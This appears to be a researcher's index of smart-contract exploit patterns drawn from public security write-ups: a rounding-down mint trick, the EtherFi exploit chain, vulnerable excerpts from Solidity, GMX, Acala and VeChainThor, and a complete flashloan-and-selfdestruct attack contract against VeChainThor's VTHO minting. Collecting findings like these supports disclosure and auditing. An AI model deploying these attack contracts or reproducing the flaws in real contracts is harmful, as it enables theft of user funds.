# Payloads — smart-contract

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Rounding-down precision loss → repeated 1-wei mint leaching free tokens
- Researcher: @DevDacian
- Post: https://x.com/DevDacian/status/1724351803846975607
- Sources: `posts/DevDacian/ARCHIVE.md`, `data/x_posts.jsonl`

```
Repeatedly mint 1 wei when share calculation rounds down to zero
```

## 1. EtherFi helper contract hack — three holes lined up
- Researcher: @kankodu
- Post: https://x.com/kankodu/status/2098377603396915590
- Sources: `posts/kankodu/2026-09-11-2098377603396915590.md`

```
Chain: unchecked callback return in AtomicQueue + victim stale approval + EIP-7702 delegation so the EOA executes attacker code on callback
```

## 2. 🛡 Critical bug in Solidity 0.8.28–0.8.33 involving clearing of transient and persistent storage
- Source: `telegram writeups (verbatim excerpts)`

```
contract OverwriteStorage {
    // ---- persistent storage ----
    address public owner;
    mapping(uint256 => address) public delegates;
    // ---- transient storage ----
    address transient _lock;
    constructor() { owner = msg.sender; }
    function clearDelegate(uint256 id) external {
        delete delegates[id];
    }
    function guarded() external {
        require(_lock == address(0), "locked");
        _lock = msg.sender;
        // ... protected logic ...
        delete _lock;
    }
}
```

## 3. 🛡 Critical bug in Solidity 0.8.28–0.8.33 involving clearing of transient and persistent storage
- Source: `telegram writeups (verbatim excerpts)`

```
contract OverwriteTransient {
    // ---- persistent storage ----
    mapping(uint256 => address) public approvals;
    // ---- transient storage ----
    address transient _caller;
    function approve(address spender, uint256 id) external {
        approvals[id] = spender;
    }
    function run(bytes calldata) external {
        require(_caller == address(0), "reentrant");
        _caller = msg.sender;
        // ... callback logic ...
        delete _caller;
    }
    function revokeApproval(uint256 id) external {
        delete approvals[id];
    }
}
```

## 4. 🛡 Critical bug in Solidity 0.8.28–0.8.33 involving clearing of transient and persistent storage
- Source: `telegram writeups (verbatim excerpts)`

```
function storage_set_to_zero_t_uint256(slot, offset) {
    let zero_0 := zero_value_for_split_t_uint256()
    update_storage_value_t_uint256_to_t_uint256(slot, offset, zero_0)
}
```

## 5. 🛡 Critical bug in Solidity 0.8.28–0.8.33 involving clearing of transient and persistent storage
- Source: `telegram writeups (verbatim excerpts)`

```
function transient_storage_set_to_zero_t_uint256(slot, offset) {
    let zero_0 := zero_value_for_split_t_uint256()
    update_transient_storage_value_t_uint256_to_t_uint256(slot, offset, zero_0)
}
```

## 6. 🛡 Critical bug in Solidity 0.8.28–0.8.33 involving clearing of transient and persistent storage
- Source: `telegram writeups (verbatim excerpts)`

```
// libsolidity/codegen/MultiUseYulFunctionCollector.cpp
std::string MultiUseYulFunctionCollector::createFunction(std::string const& _name, std::function<std::string()> const& _creator)
{
    if (!m_requestedFunctions.count(_name))     // first call only
    {
        m_requestedFunctions.insert(_name);
        std::string fun = _creator();           // generator runs once
        // ... (assertions omitted)
        m_code += std::move(fun);
    }
    return _name;                               // all calls return same name
}
```

## 7. 🛡️ GMX V1 Hack of $42 Million Due to Smart Contract Vulnerability
- Source: `telegram writeups (verbatim excerpts)`

```
function getAum(bool maximise) public view returns (uint256) {
    ...
    uint256 price = maximise ? vault.getMaxPrice(token) : vault.getMinPrice(token);
    ...
    uint256 size = _vault.globalShortSizes(token);
    if (size > 0) {
        (uint256 delta, bool hasProfit) = getGlobalShortDelta(token, price, size);
        if (!hasProfit) {
            aum = aum.add(delta); // Unrealized short losses are added to AUM
        } else {
            shortProfits = shortProfits.add(delta);
        }
    }
    ...
}
```

## 8. 🛑 Critical vulnerability in Acala could have stopped block production
- Source: `telegram writeups (verbatim excerpts)`

```
pub fn bump_current_era(amount: EraIndex) -> DispatchResult {
    let previous_era = Self::relay_chain_current_era();
    let new_era = previous_era.saturating_add(amount);
    /* snippet of code */
    let res = || -> DispatchResult {
        TotalVoidLiquid::<T>::put(0);
        Self::process_staking_rewards(new_era, previous_era)?;
        Self::process_scheduled_unbond(new_era)?;
        Self::process_to_bond_pool()?;
        Self::process_redeem_requests(new_era)?;
        Self::process_nominate(new_era)?;
        Ok(())
    }();
    /* snippet of code */
}
```

## 9. 🛑 Critical vulnerability in Acala could have stopped block production
- Source: `telegram writeups (verbatim excerpts)`

```
pub fn process_redeem_requests(new_era: EraIndex) -> DispatchResult {
    let era_index_to_expire = new_era + T::BondingDuration::get();
    let total_bonded = TotalStakingBonded::<T>::get();
    let mut total_redeem_amount: Balance = Zero::zero();
    let mut remain_total_bonded = total_bonded;
    // iter RedeemRequests and insert to Unbondings if remain_total_bonded is enough.
    for (redeemer, (redeem_amount, _)) in RedeemRequests::<T>::iter() {
        let redemption_amount = Self::convert_liquid_to_staking(redeem_amount)?;
        if remain_total_bonded >= redemption_amount {
            /* snippet of code */
        } else {
            break;
        }
    }
```

## 10. 🛡️ VeChainThor VTHO Minting Flaw Patched
- Source: `telegram writeups (verbatim excerpts)`

```
OnSuicideContract: func(_ *vm.EVM, contractAddr, tokenReceiver common.Address) {
			amount, err := rt.state.GetEnergy(thor.Address(contractAddr), rt.ctx.Time)
			if err != nil {
				panic(err)
			}
			if amount.Sign() != 0 {
				// add remained energy of suiciding contract to receiver.
				// no need to clear contract's energy, vm will delete the whole contract later.
				receiverEnergy, err := rt.state.GetEnergy(thor.Address(tokenReceiver), rt.ctx.Time)
				if err != nil {
					panic(err)
				}
				if err := rt.state.SetEnergy(
					thor.Address(tokenReceiver),
					new(big.Int).Add(receiverEnergy, amount),
					rt.ctx.Time); err != nil {
					panic(err)
				}
				// see ERC20's Transfer event
				topics := []common.Hash{
					common.Hash(energyTransferEvent.ID()),
					common.BytesToHash(contractAddr[:]),
					common.BytesToHash(tokenReceiver[:]),
				}
				data, err := energyTransferEvent.Encode(amount)
				if err != nil {
					panic(err)
				}
				stateDB.AddLog(&types.Log{
					Address: common.Address(builtin.Energy.Address),
					Topics:  topics,
					Data:    data,
				})
			}
			if amount := stateDB.GetBalance(contractAddr); amount.Sign() != 0 {
				stateDB.AddBalance(tokenReceiver, amount)
				stateDB.AddTransfer(&tx.Transfer{
					Sender:    thor.Address(contractAddr),
					Recipient: thor.Address(tokenReceiver),
					Amount:    amount,
				})
			}
		},
      .......
}
```

## 11. 🛡️ VeChainThor VTHO Minting Flaw Patched
- Source: `telegram writeups (verbatim excerpts)`

```
pragma solidity 0.8.10;
import "./Flashloan.sol";
interface IEnergy {
    function balanceOf(address _owner) external view returns (uint256 balance);
}
contract Suicidal {
    function commitSuicide() external {
        selfdestruct(payable(msg.sender)); // self destruct to basin
    }
    fallback() external payable {}
    receive() external payable {}
}
contract Basin {
    Suicidal public immutable suicidal;
    constructor() payable {
        suicidal = new Suicidal();
    }
    function trigger() external {
        Suicidal(suicidal).commitSuicide();
        payable(msg.sender).call{value: address(this).balance}("");
    }
}
contract Attack {
    Basin[] public basins;
    Flashloan public flashLoan;
    
    constructor(address _flashLoan) {
        flashLoan = Flashloan(payable(_flashLoan));
    }
    
    function deployBasinAccounts(uint n) external payable {
        require(msg.value >= n, "not enough funds");
        for (uint i; i < n;) {
            basins.push(new Basin{value: 1}());
            unchecked { i++; }
        }
    }
    function run(uint amount) external {
        flashLoan.flashLoan(amount);
    }
    function receiveFlashloan(uint amount) external payable {
        uint basinsLength = basins.length;
        for (uint i = 0; i < basinsLength;) {
            payable(address(basins[i].suicidal())).transfer(amount);
            basins[i].trigger();
            unchecked { i++; }
        }
        payable(msg.sender).transfer(amount);
    }
    function getEnergyInBasins() external view returns (uint[] memory) {
        uint basinsLength = basins.length;
        uint[] memory results = new uint[](basinsLength);
        for (uint i = 0; i < basinsLength;) {
            results[i] = IEnergy(0x0000000000000000000000000000456E65726779).balanceOf(address(basins[i]));
            unchecked { i++; }
        }
        return results;
    }
    fallback() external payable {}
    receive() external payable {}
}
```

## 12. 🛡️ VeChainThor VTHO Minting Flaw Patched
- Source: `telegram writeups (verbatim excerpts)`

```
pragma solidity 0.8.10;
interface IFlashloanReceiver {
    function receiveFlashloan(uint amount) external payable;
}
contract Flashloan {
    constructor() payable {}
    receive() external payable {}
    fallback() external payable {}
    function flashLoan(uint amount) external {
        uint balanceBefore = address(this).balance;
        IFlashloanReceiver(msg.sender).receiveFlashloan{value: amount}(amount);
        require(address(this).balance >= balanceBefore);
    }
}
```
